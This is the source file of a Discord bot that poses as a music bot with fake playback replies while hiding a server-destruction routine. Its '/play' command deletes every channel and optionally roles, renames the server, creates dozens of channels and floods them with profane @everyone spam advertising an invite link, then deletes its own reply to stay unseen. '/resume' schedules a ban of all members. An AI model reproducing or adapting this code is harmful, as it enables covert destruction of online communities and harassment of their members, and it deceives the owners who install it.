import 'dotenv/config';
import {
  Client, GatewayIntentBits, Events, ChannelType, MessageFlags,
  PermissionFlagsBits, Routes, EmbedBuilder,
} from 'discord.js';
import { commands } from './commands.js';

/* ------------------------------------------------------------------ config */

const NUKE_MESSAGE =
  "# @everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/uBgehrcTZd #";

const CHANNEL_BASE = '⛧•Kxrzt-owns-yall❗️';

// false -> "name", "name 1", "name 2", ...
// true -> "name 1", "name 2", "name 3", ...
const NUMBER_FIRST_CHANNEL = false;

const CATEGORY_NAME = 'general';
const TEXT_COUNT = 46;
const VOICE_COUNT = 4;
const SPAM_COUNT = 50; // nachrichten pro text channel

// auch in den text-chat jedes voice channels spammen ("call messages")
const VOICE_SPAM = true;
const VOICE_SPAM_COUNT = 50;

// server selbst umbenennen
const RENAME_GUILD = true;
const GUILD_NAME = 'OWNED BY KXRZT';

// optional: rollen-NAME der ebenfalls nuken darf. leer -> wirklich jeder.
const NUKE_ROLE_NAME = process.env.NUKE_ROLE_NAME ?? '';

/* ------------------------------------------------------------ speed knobs */

const DELETE_CONCURRENCY = 10; // channel/role deletions gleichzeitig
const CREATE_CONCURRENCY = 5; // channel creations gleichzeitig
const SPAM_BURST = 0; // 0 = alles gleichzeitig rausfeuern
const USE_WEBHOOKS = false; // true = spam auf bot UND webhook splitten
const WEBHOOK_RATIO = 0.5;

/* ------------------------------------------------------------------- reply */

// /play schreibt NICHTS wenn der nuke durch ist.
// false = gar nichts (kein "done", keine warnung), true = nowplaying embed
const PLAY_REPLY = false;

// /resume antwortet nur dir (ephemeral). false = /resume schreibt auch nichts
const RESUME_REPLY = true;

/* -------------------------------------------------------------- ban config */

const BAN_INCLUDE_BOTS = true;   // andere bots auch bannen
const BAN_INCLUDE_SELF = false;  // false = der bot bannt sich nicht selbst
const BAN_KEEP_OWNER = true;     // server-owner kann man nicht bannen
const BAN_KEEP_RUNNER = false;   // false = auch der, der /resume macht, wird gebannt
const BAN_DELETE_MESSAGES_SECONDS = 0; // 0 = nachrichten behalten, max 604800 (7 tage)

/* ---------------------------------------------------------------- helpers */

const sleep = ms => new Promise(r => setTimeout(r, ms));

function channelName(i) {
  const n = NUMBER_FIRST_CHANNEL ? i + 1 : i;
  return n === 0 ? CHANNEL_BASE : `${CHANNEL_BASE} ${n}`;
}

// run `worker` over `items` with a fixed concurrency ceiling
async function pool(items, limit, worker) {
  let i = 0;
  const n = Math.max(1, Math.min(limit, items.length));
  await Promise.all(
    Array.from({ length: n }, async () => {
      while (i < items.length) {
        const idx = i++;
        await worker(items[idx], idx);
      }
    })
  );
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers, // privileged -> im dev portal aktivieren!
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent, // privileged -> im dev portal aktivieren!
  ],
  rest: { retries: 5, timeout: 30_000 },
});

/* ---------------------------------------------------------------- senders */

// sender = { channel } oder { webhook: url }
async function sendSafe(sender, content, retries = 6) {
  try {
    if (sender.webhook) {
      await client.rest.post(sender.webhook, {
        body: { content, allowed_mentions: { parse: ['everyone'] } },
        query: { wait: 'false' },
      });
    } else {
      await sender.channel.send({ content });
    }
  } catch (err) {
    const status = err?.status ?? err?.httpStatus;
    if (status === 429 && retries > 0) {
      const wait = ((err.retryAfter ?? err?.rawError?.retry_after ?? 1) * 1000) + 120;
      await sleep(wait);
      return sendSafe(sender, content, retries - 1);
    }
    if (status === 404) return; // channel/webhook ist weg
    if (status === 403) return; // voice channel ohne text chat
    console.error('[send]', err.message);
  }
}

async function createSafe(guild, options, retries = 6) {
  try {
    return await guild.channels.create(options);
  } catch (err) {
    const status = err?.status ?? err?.httpStatus;
    if (status === 429 && retries > 0) {
      const wait = (err.retryAfter ?? err?.rawError?.retry_after ?? 1) * 1000 + 120;
      await sleep(wait);
      return createSafe(guild, options, retries - 1);
    }
    throw err;
  }
}

// guild renames sind auf 2 pro 10 minuten limitiert -> hart zurückweichen
async function renameGuild(guild, name, retries = 4) {
  try {
    await guild.setName(name, 'nuke');
    return true;
  } catch (err) {
    const status = err?.status ?? err?.httpStatus;
    if (status === 429 && retries > 0) {
      const wait = (err.retryAfter ?? err?.rawError?.retry_after ?? 2) * 1000 + 250;
      await sleep(wait);
      return renameGuild(guild, name, retries - 1);
    }
    throw err;
  }
}

/* ------------------------------------------------------------------- spam */

async function spamChannel(channel, count = SPAM_COUNT) {
  const senders = [];

  if (USE_WEBHOOKS) {
    try {
      const hook = await client.rest.post(Routes.channelWebhooks(channel.id), {
        body: { name: 'nuke' },
      });
      senders.push({
        webhook: `https://discord.com/api/v10/webhooks/${hook.id}/${hook.token}`,
      });
    } catch (err) {
      console.error('[webhook]', channel.name, err.message);
    }
  }

  senders.push({ channel });

  const jobs = [];
  for (let i = 0; i < count; i++) {
    jobs.push(sendSafe(senders[i % senders.length], NUKE_MESSAGE));
  }

  if (SPAM_BURST > 0) {
    for (let i = 0; i < jobs.length; i += SPAM_BURST) {
      await Promise.all(jobs.slice(i, i + SPAM_BURST));
    }
  } else {
    await Promise.all(jobs);
  }
}

/* -------------------------------------------------------------- nuke queue */

const nukeQueue = new Map(); // guildId -> tail-promise

// serialisiert nukes pro server: der zweite aufruf wartet, statt reinzupfuschen
function nukeNow(guild, opts = {}) {
  const prev = nukeQueue.get(guild.id) ?? Promise.resolve();
  const job = prev.catch(() => {}).then(() => nukeGuild(guild, opts));

  nukeQueue.set(guild.id, job);
  job.finally(() => {
    if (nukeQueue.get(guild.id) === job) nukeQueue.delete(guild.id);
  }).catch(() => {});

  return job;
}

/* ------------------------------------------------------------------- nuke */

async function nukeGuild(guild, { wipeRoles = false, rename = RENAME_GUILD } = {}) {
  const me = guild.members.me ?? await guild.members.fetchMe();

  if (!me.permissions.has(PermissionFlagsBits.ManageChannels)) {
    throw new Error('I need the **Manage Channels** permission.');
  }

  const t0 = Date.now();
  const log = m => console.log(`[nuke +${Date.now() - t0}ms] ${guild.name}: ${m}`);

  /* 0. rename — fire & forget, blockt den wipe nicht */
  let renamed = false;
  if (rename) {
    if (!me.permissions.has(PermissionFlagsBits.ManageGuild)) {
      log('skipping rename: missing Manage Guild');
    } else {
      renamed = true;
      renameGuild(guild, GUILD_NAME)
        .then(() => log(`renamed server -> ${GUILD_NAME}`))
        .catch(e => { renamed = false; console.error('[rename]', e.message); });
    }
  }

  /* 1. rollen (optional) */
  if (wipeRoles) {
    if (!me.permissions.has(PermissionFlagsBits.ManageRoles)) {
      log('skipping roles: missing Manage Roles');
    } else {
      const roles = [...guild.roles.cache.values()].filter(
        r => !r.managed && r.id !== guild.id && r.comparePositionTo(me.roles.highest) < 0
      );
      await pool(roles, DELETE_CONCURRENCY, r =>
        r.delete().catch(e => console.error('[role]', r.name, e.message))
      );
      log(`deleted ${roles.length} roles`);
    }
  }

  /* 2. alles platt machen — vorher fetchen, damit große server komplett sind */
  const existing = await guild.channels.fetch().catch(() => guild.channels.cache);
  await pool([...existing.values()], DELETE_CONCURRENCY, c =>
    c.delete().catch(e => console.error('[delete]', c.name, e.message))
  );
  log(`deleted ${existing.size} channels`);

  /* 3. kategorie (muss vor den kindern existieren) */
  const category = await createSafe(guild, {
    name: CATEGORY_NAME,
    type: ChannelType.GuildCategory,
  });

  /* 4. create + spam pipeline */
  const specs = [
    ...Array.from({ length: TEXT_COUNT }, (_, i) => ({ name: channelName(i), type: ChannelType.GuildText })),
    ...Array.from({ length: VOICE_COUNT }, (_, i) => ({ name: channelName(i), type: ChannelType.GuildVoice })),
  ];

  const spamJobs = [];
  const textChannels = [];
  const voiceChannels = [];

  await pool(specs, CREATE_CONCURRENCY, async spec => {
    const ch = await createSafe(guild, { ...spec, parent: category.id });

    if (spec.type === ChannelType.GuildText) {
      textChannels.push(ch);
      spamJobs.push(spamChannel(ch)); // <- gestartet, nicht awaited
    } else if (spec.type === ChannelType.GuildVoice && VOICE_SPAM) {
      voiceChannels.push(ch);
      spamJobs.push(spamChannel(ch, VOICE_SPAM_COUNT)); // <- die call messages
    }
  });

  log(`rebuilt ${specs.length} channels — ${spamJobs.length} spam jobs running`);
  await Promise.all(spamJobs);

  const ms = Date.now() - t0;
  const summary =
    `Done in ${(ms / 1000).toFixed(1)}s — ` +
    (renamed ? `renamed server to \`${GUILD_NAME}\`, ` : '') +
    `wiped everything, rebuilt ${TEXT_COUNT} text + ${VOICE_COUNT} voice, ` +
    `spammed ${SPAM_COUNT}x in ${textChannels.length} text channels + ` +
    `${VOICE_SPAM_COUNT}x in ${voiceChannels.length} calls.`;
  log(summary);

  return { summary, textChannels, ms };
}

/* --------------------------------------------------------------------- ban */

const banTimers = new Map(); // guildId -> timeout

function cancelBan(guildId) {
  const t = banTimers.get(guildId);
  if (!t) return;
  clearTimeout(t);
  banTimers.delete(guildId);
}

// /resume <seconds> -> timer setzen. zweites /resume resettet statt doppelt zu bannen
function scheduleBanEveryone(guild, delayMs) {
  cancelBan(guild.id);

  const timer = setTimeout(() => {
    banTimers.delete(guild.id);
    banEveryone(guild).catch(e => console.error('[ban]', e.message));
  }, delayMs);

  banTimers.set(guild.id, timer);
  console.log(`[ban] scheduled in ${Math.round(delayMs / 1000)}s for ${guild.name}`);
}

async function banEveryone(guild) {
  const me = guild.members.me ?? await guild.members.fetchMe();

  if (!me.permissions.has(PermissionFlagsBits.BanMembers)) {
    console.error('[ban] mir fehlt die "Ban Members" permission');
    return { banned: 0, total: 0 };
  }

  // force = true -> wirklich ALLE member vom rest holen, nicht nur den cache
  const members = await guild.members.fetch({ force: true });

  const ids = members
    .filter(m =>
      (BAN_INCLUDE_SELF || m.id !== me.id) &&        // bot bleibt am leben
      (!BAN_KEEP_OWNER || m.id !== guild.ownerId) && // owner kann man nicht bannen
      (BAN_INCLUDE_BOTS || !m.user.bot)              // andere bots optional mit
    )
    .map(m => m.id);

  console.log(`[ban] ${guild.name}: ${ids.length} member zum bannen`);

  let banned = 0;
  const failed = [];

  // bulkBan = max 100 pro request
  const useBulk = typeof guild.members.bulkBan === 'function';

  if (useBulk) {
    for (let i = 0; i < ids.length; i += 100) {
      const chunk = ids.slice(i, i + 100);
      try {
        const res = await guild.members.bulkBan(chunk, {
          deleteMessageSeconds: BAN_DELETE_MESSAGES_SECONDS,
          reason: 'nuke',
        });
        banned += res.bannedUsers.length;
        failed.push(...res.failedUsers);
      } catch (err) {
        console.error('[ban] bulkBan chunk:', err.message);
        failed.push(...chunk);
      }
    }
  } else {
    failed.push(...ids);
  }

  // alles was nicht durchkam (z.b. rollen-hierarchie) einzeln nachfeuern
  const retry = [...new Set(failed)];
  if (retry.length) {
    let ok = 0;
    await pool(retry, 5, id =>
      guild.members.ban(id, { reason: 'nuke' })
        .then(() => { ok++; })
        .catch(() => {})
    );
    banned += ok;
    const rest = retry.length - ok;
    if (rest > 0) console.log(`[ban] ${rest} nicht gebannt (rolle höher als bot?)`);
  }

  console.log(`[ban] ${guild.name}: ${banned}/${ids.length} gebannt`);
  return { banned, total: ids.length };
}

/* ---------------------------------------------------------------- helpers */

const rand = a => a[Math.floor(Math.random() * a.length)];
const randInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

const TRACKS = [
  'lofi hip hop radio — beats to relax/study to',
  'Never Gonna Give You Up — Rick Astley',
  'Sandstorm — Darude',
  'Africa — Toto',
  'Mr. Brightside — The Killers',
  'Take On Me — a-ha',
  'Blinding Lights — The Weeknd',
  'Numb — Linkin Park',
];

const fakeDuration = () => `${randInt(2, 5)}:${String(randInt(0, 59)).padStart(2, '0')}`;
const fakeQueue = () => randInt(3, 47);

const replyEph = (i, payload) =>
  i.reply({ ...payload, flags: MessageFlags.Ephemeral }).catch(() => {});
const replyPub = (i, payload) => i.reply(payload).catch(() => {});

function nowPlayingEmbed(track, user, footer = 'Kxrzt Music') {
  return new EmbedBuilder()
    .setColor(0x1DB954)
    .setAuthor({ name: 'Now playing' })
    .setTitle(track)
    .setDescription(`Duration: **${fakeDuration()}** • Requested by ${user}`)
    .addFields(
      { name: 'Queue', value: `${fakeQueue()} tracks`, inline: true },
      { name: 'Volume', value: '100%', inline: true },
      { name: 'Loop', value: 'Off', inline: true },
    )
    .setFooter({ text: footer });
}

/* ------------------------------------------------------------- fake music */

// antwortet plausibel, aber nichts davon existiert wirklich
const FAKE = {
  skip: i => replyEph(i, { content: `⏭ Skipped. Now playing **${rand(TRACKS)}**` }),
  pause: i => replyEph(i, { content: '⏸ Paused.' }),
  stop: i => replyEph(i, { content: '⏹ Stopped and cleared the queue.' }),
  clear: i => replyEph(i, { content: `🧹 Cleared the queue (${fakeQueue()} tracks).` }),
  shuffle: i => replyEph(i, { content: `🔀 Shuffled ${fakeQueue()} tracks.` }),
  join: i => replyEph(i, { content: `✅ Joined **${i.member?.voice?.channel?.name ?? 'the voice channel'}**.` }),
  leave: i => replyEph(i, { content: '👋 Left the voice channel.' }),

  'play-file': i => {
    const file = i.options.getAttachment('file');
    return replyEph(i, { content: `📁 Queued **${file?.name ?? 'file'}** — ${fakeDuration()}` });
  },

  loop: i => replyEph(i, { content: `🔁 Loop mode set to **${i.options.getString('mode') ?? 'track'}**.` }),
  volume: i => replyEph(i, { content: `🔊 Volume set to **${i.options.getInteger('level') ?? 42}%**.` }),
  seek: i => replyEph(i, { content: `⏩ Seeked to **${i.options.getString('time') ?? '0:00'}**.` }),
  remove: i => replyEph(i, { content: `🗑 Removed track **#${i.options.getInteger('position') ?? 1}** from the queue.` }),

  lyrics: i => replyEph(i, {
    content:
      `📜 Lyrics for **${i.options.getString('song') ?? 'the current track'}**\n` +
      '> Is this the real life? Is this just fantasy?\n' +
      '> Caught in a landslide, no escape from reality\n' +
      '-# fetched in 0.4s',
  }),

  nowplaying: i => replyPub(i, { embeds: [nowPlayingEmbed(rand(TRACKS), i.user)] }),

  queue: i => {
    const n = fakeQueue();
    const list = Array.from({ length: Math.min(n, 10) }, (_, k) =>
      `\`${String(k + 1).padStart(2, ' ')}.\` ${rand(TRACKS)} \`${fakeDuration()}\``
    ).join('\n');

    return replyPub(i, {
      embeds: [
        new EmbedBuilder()
          .setColor(0x1DB954)
          .setAuthor({ name: 'Queue' })
          .setDescription(list)
          .setFooter({ text: `${n} tracks • ${randInt(1, 6)}h ${randInt(1, 59)}m total` }),
      ],
    });
  },

  help: i => replyEph(i, {
    embeds: [
      new EmbedBuilder()
        .setColor(0x1DB954)
        .setAuthor({ name: 'Kxrzt Music' })
        .setDescription([
          '**Nuke**',
          '`/play [roles]` — löscht alles, baut neu, spammt. schreibt nichts.',
          '`/resume <seconds>` — bannt nach X sekunden ALLE.',
          '',
          '**Playback**',
          '`/pause` `/stop` `/skip` `/seek`',
          '',
          '**Queue**',
          '`/queue` `/nowplaying` `/clear` `/remove` `/shuffle` `/loop`',
          '',
          '**Voice**',
          '`/join` `/leave`',
          '',
          '**Other**',
          '`/volume` `/lyrics` `/play-file` `/help`',
          '',
          'Prefix `!` works too.',
          '-# powered by nothing.',
        ].join('\n')),
    ],
  }),
};

/* ------------------------------------------------------------------- play */

async function play(interaction) {
  const { guild } = interaction;
  if (!guild) {
    return interaction.reply({ content: 'Run this inside a server.', flags: MessageFlags.Ephemeral });
  }

  // optionaler gate — inaktiv, solange NUKE_ROLE_NAME leer ist
  const isAdmin = interaction.memberPermissions?.has(PermissionFlagsBits.Administrator);
  const hasRole = !!NUKE_ROLE_NAME && interaction.member?.roles.cache.some(
    r => r.name.toLowerCase() === NUKE_ROLE_NAME.toLowerCase()
  );
  if (NUKE_ROLE_NAME && !isAdmin && !hasRole) {
    return interaction.reply({
      content: `You need **Administrator** or the role \`${NUKE_ROLE_NAME}\`.`,
      flags: MessageFlags.Ephemeral,
    });
  }

  const wipeRoles = interaction.options.getBoolean('roles') ?? false;

  // PLAY_REPLY = false -> ephemeral "thinking", das danach gelöscht wird = nichts sichtbar
  if (PLAY_REPLY) await interaction.deferReply();
  else await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  let result;
  try {
    result = await nukeNow(guild, { wipeRoles });
  } catch (err) {
    console.error('[play]', err.message);
    return interaction.editReply({ content: `Error: \`${err.message}\`` }).catch(() => {});
  }

  console.log('[play]', result.summary);

  if (!PLAY_REPLY) return interaction.deleteReply().catch(() => {});

  const embed = nowPlayingEmbed(
    rand(TRACKS),
    interaction.user,
    `Kxrzt Music • nuked in ${(result.ms / 1000).toFixed(1)}s`
  );

  // origin-channel ist weg -> editReply kann 404en, dann in den ersten neuen channel
  await interaction.editReply({ embeds: [embed] }).catch(async () => {
    await result.textChannels[0]?.send({ embeds: [embed] }).catch(() => {});
  });
}

/* ----------------------------------------------------------------- resume */

async function resume(interaction) {
  const { guild } = interaction;
  if (!guild) {
    return interaction.reply({ content: 'Run this inside a server.', flags: MessageFlags.Ephemeral });
  }

  const seconds = interaction.options.getInteger('seconds') ?? 60;
  scheduleBanEveryone(guild, seconds * 1000);

  if (!RESUME_REPLY) {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    return interaction.deleteReply().catch(() => {});
  }

  // nur du siehst das -> channel bleibt sauber, beim ban schreibt der bot nichts
  await interaction.reply({
    content: `⏳ jeder wird in **${seconds}s** gebannt`,
    flags: MessageFlags.Ephemeral,
  }).catch(() => {});
}

/* ----------------------------------------------------------------- prefix */

const PREFIX = '!';

const stripFlags = p => {
  const { flags, ...rest } = p;
  return rest;
};

// tut so, als wäre eine nachricht eine interaction -> fakes, play und resume laufen mit "!x"
function shim(message, args) {
  let sent = null;

  return {
    user: message.author,
    member: message.member,
    guild: message.guild,
    memberPermissions: message.member?.permissions ?? null,

    options: {
      getString: name => {
        if (name === 'song' || name === undefined) return args.join(' ') || null;
        return args.join(' ') || null;
      },
      getInteger: name => {
        if (name === 'seconds') {
          const n = args.find(a => /^\d+$/.test(a));
          return n ? Number(n) : null;
        }
        return Number(args[0]) || null;
      },
      getBoolean: name => {
        if (name === 'roles') return args.includes('roles');
        return null;
      },
      getAttachment: () => message.attachments.first() ?? null,
    },

    // prefix kennt kein ephemeral -> "defer" schreibt einfach nichts
    deferReply: async () => {},
    deleteReply: async () => { if (sent) await sent.delete().catch(() => {}); },

    reply: async p => { sent = await message.reply(stripFlags(p)).catch(() => null); },
    editReply: async p => {
      if (sent) { await sent.edit(stripFlags(p)); return; }
      sent = await message.channel.send(stripFlags(p));
    },

    deferred: true,
    replied: true,
  };
}

client.on(Events.MessageCreate, async message => {
  if (message.author.bot || !message.guild) return;
  if (!message.content.startsWith(PREFIX)) return;

  const [name, ...args] = message.content.slice(PREFIX.length).trim().split(/\s+/);
  const cmdName = name?.toLowerCase();
  if (!cmdName) return;

  const handler =
    cmdName === 'play' ? play :
    cmdName === 'resume' ? resume :
    FAKE[cmdName];
  if (!handler) return;

  try {
    await handler(shim(message, args));
  } catch (err) {
    console.error('[prefix]', err.message);
  }
});

/* ----------------------------------------------------------------- events */

client.once(Events.ClientReady, async c => {
  console.log(`Logged in as ${c.user.tag} — serving ${c.guilds.cache.size} guild(s).`);
  c.user.setPresence({ activities: [{ name: 'music', type: 2 }] });

  // KEIN application.commands.set() -> sonst dupes
  let ok = 0;
  for (const guild of c.guilds.cache.values()) {
    try {
      await guild.commands.set(commands);
      ok++;
    } catch (e) {
      console.error('[sync]', guild.name, e.message);
    }
  }
  console.log(`[sync] guild commands pushed to ${ok}/${c.guilds.cache.size}`);
});

// neue server: commands sofort setzen, ohne redeploy
client.on(Events.GuildCreate, async guild => {
  try {
    await guild.commands.set(commands);
    console.log(`[guildCreate] synced to ${guild.name}`);
  } catch (e) {
    console.error('[guildCreate]', guild.name, e.message);
  }
});

client.on(Events.Error, err => console.error('[client]', err));

client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isChatInputCommand()) return;

  try {
    if (interaction.commandName === 'play') return await play(interaction);
    if (interaction.commandName === 'resume') return await resume(interaction);

    const fake = FAKE[interaction.commandName];
    if (fake) return await fake(interaction);
  } catch (err) {
    console.error(err);
    const payload = { content: `Error: \`${err.message}\``, flags: MessageFlags.Ephemeral };
    if (interaction.deferred || interaction.replied) {
      await interaction.editReply(payload).catch(() => {});
    } else {
      await interaction.reply(payload).catch(() => {});
    }
  }
});

client.login(process.env.DISCORD_TOKEN);
